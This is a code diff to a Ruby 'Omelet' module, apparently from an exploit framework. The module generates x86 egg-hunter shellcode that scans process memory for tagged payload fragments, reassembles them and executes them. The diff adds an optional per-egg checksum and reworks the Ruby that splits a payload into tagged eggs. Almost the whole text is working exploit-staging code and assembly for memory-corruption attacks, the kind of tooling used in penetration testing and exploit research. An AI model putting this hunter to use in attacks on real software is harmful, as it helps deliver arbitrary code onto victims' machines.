@@ -84,8 +84,9 @@ class Omelet
 			eggsize       = opts[:eggsize] || 123
 			eggtag        = opts[:eggtag] || "00w"
 			searchforward = opts[:searchforward] || true
-			reset         = opts[:reset] || false
+			reset         = opts[:reset]
 			startreg      = opts[:startreg]
+         usechecksum   = opts[:checksum]
 
 			return nil if ((opts = hunter_stub) == nil)
 
@@ -114,36 +115,39 @@ class Omelet
 			searchstub2  = nil
 			flipflagpre  = ''
 			flipflagpost = ''
+			checksum     = ''
 
 			if searchforward
 				# clear direction flag
-				setflag     = "cld\n"
-				searchstub1 = "dec edx\n" * 4
-				searchstub2 = "inc edx\n"
+				setflag     = "cld"
+				searchstub1 = "dec edx; dec edx; dec edx; dec edx"
+				searchstub2 = "inc edx"
 			else
 				# set the direction flag
 				setflag      = "std"
-				searchstub1  = "inc edx\n" * 4
-				searchstub2  = "dec edx\n"
-				flipflagpre  = "cld\nsub esi,-8\n"
-				flipflagpost = "std\n"
+				searchstub1  = "inc edx; inc edx; inc edx; inc edx"
+				searchstub2  = "dec edx"
+				flipflagpre  = "cld; sub esi,-8"
+				flipflagpost = "std"
 			end
 
 			# prepare the stub that starts the search
 			startstub = ''
 			if startreg
 				if startreg.downcase != 'ebp'
-					startstub << "mov ebp,#{startreg}\n"
+					startstub << "mov ebp,#{startreg}"
 				end
-				startstub << "mov edx,ebp\n"
+				startstub << "; " if startstub.length > 0
+				startstub << "mov edx,ebp"
 			end
 			# a register will be used as start location for the search
-			startstub << "push esp\n" + "pop edi\n" + "or di,0xffff\n"
+			startstub << "; " if startstub.length > 0
+			startstub << "push esp; pop edi; or di,0xffff"
 			# edx will be used, start at end of stack frame
 			if not startreg
-				startstub << "mov edx,edi\n"
+				startstub << "; mov edx,edi"
 				if reset
-					startstub << "push edx\n" + "pop ebp\n"
+					startstub << "; push edx; pop ebp"
 				end
 			end
 
@@ -151,8 +155,24 @@ class Omelet
 			# will allow to find eggs when they are out of order/sequence
 			resetstart = ''
 			if reset
-				resetstart = "push ebp\n" + "pop edx\n"
-			end 
+				resetstart = "push ebp; pop edx"
+			end
+
+         #checksum code by dijital1 & corelanc0d3r
+			if usechecksum
+				checksum = <<EOS
+	xor ecx,ecx
+	xor eax,eax
+calc_chksum_loop:
+	add al,byte [edx+ecx]
+	inc ecx
+	cmp cl, egg_size
+	jnz calc_chksum_loop
+test_chksum:
+	cmp al,byte [edx+ecx]
+	jnz find_egg
+EOS
+			end
 
 			# create omelet code
 			omelet_hunter = <<EOS
@@ -160,11 +180,11 @@ class Omelet
 	nr_eggs equ 0x#{nr_eggs_hex}	; number of eggs
 	egg_size equ 0x#{eggsize_hex} 	; nr bytes of payload per egg
 	hex_tag equ 0x#{hextag}		; tag
-	
-	#{setflag}			; set direction flag
+
+	#{setflag}			; set/clear direction flag
 	jmp start
-	
-	; routine to calculate the target location 
+
+	; routine to calculate the target location
 	; for writing recombined shellcode (omelet)
 	; I'll use EDI as target location
 	; First, I'll make EDI point to end of stack
@@ -173,11 +193,11 @@ get_target_loc:
 	#{startstub}		; use edx as start location for the search
 	xor eax,eax		; zero eax
 	mov al,nr_eggs		; put number of eggs in eax
-	
+
 calc_target_loc:
 	xor esi,esi		; use esi as counter to step back
 	mov si,0-(egg_size+20)	; add 20 bytes of extra space, per egg
-	
+
 get_target_loc_loop:	; start loop
 	dec edi		; step back
 	inc esi		; and update ESI counter
@@ -187,21 +207,21 @@ get_target_loc_loop:	; start loop
                ; into account yet
 	jnz calc_target_loc
 
-	; edi now contains target location 
+	; edi now contains target location
 	; for recombined shellcode
 	xor ebx,ebx		; put loop counter in ebx
 	mov bl,nr_eggs+1
 	ret
-	
+
 start:
 	call get_target_loc	; jump to routine which will calculate shellcode dst address
-	
+
 	; start looking for eggs, using edx as basepointer
 	jmp search_next_address
-	
+
 find_egg:
 	#{searchstub1}		; based on search direction
-	
+
 search_next_address:
 	#{searchstub2}		; based on search direction
 	push edx		; save edx
@@ -215,10 +235,13 @@ search_next_address:
 	mov eax,hex_tag	; if address is readable, prepare tag in eax
 	add eax,ebx		; add offset (ebx contains egg counter, remember ?)
 	xchg edi,edx		; switch edx/edi
-	scasd			; edi points to the tag ? 
+	scasd			; edi points to the tag ?
 	xchg edi,edx		; switch edx/edi back
 	jnz find_egg		; if tag was not found, go to next address
 	;found the tag at edx
+
+   ;do we need to verify checksum ? (prevents finding corrupted eggs)
+   #{checksum}
 
 copy_egg:
 	; ecx must first be set to egg_size (used by rep instruction) and esi as source
@@ -233,7 +256,7 @@ copy_egg:
 	cmp bl,1		; found all eggs ?
 	jnz find_egg		; no = look for next egg
 	; done - all eggs have been found and copied
-	
+
 done:
 	call get_target_loc	; re-calculate location where recombined shellcode is placed
 	cld
@@ -243,8 +266,6 @@ EOS
 			the_omelet = Metasm::Shellcode.assemble(Metasm::Ia32.new, omelet_hunter).encode_string
 
 			# create the eggs array
-
-			eggs = Array.new(nr_eggs)
 			total_size = eggsize * nr_eggs
 			padlen = total_size - payloadlen
 			payloadpadding = "A" * padlen
@@ -252,16 +273,24 @@ EOS
 			fullcode = payload + payloadpadding
 			eggcnt = nr_eggs + 2
 			startcode = 0
-			arraycnt = 0
 
+			eggs = []
 			while eggcnt > 2 do
 				egg_prep = eggcnt.chr + eggtag
 				this_egg = fullcode[startcode, eggsize]
-				startcode = startcode + eggsize
+            if usechecksum
+					cksum = 0
+					this_egg.each_byte { |b|
+						cksum += b
+					}
+					this_egg << [cksum & 0xff].pack('C')
+				end
+
 				this_egg = egg_prep + this_egg
-				eggcnt = eggcnt - 1
-				eggs[arraycnt] = this_egg
-				arraycnt = arraycnt + 1
+				eggs << this_egg
+
+				eggcnt -= 1
+				startcode += eggsize
 			end
 
 			return [ the_omelet, eggs ]
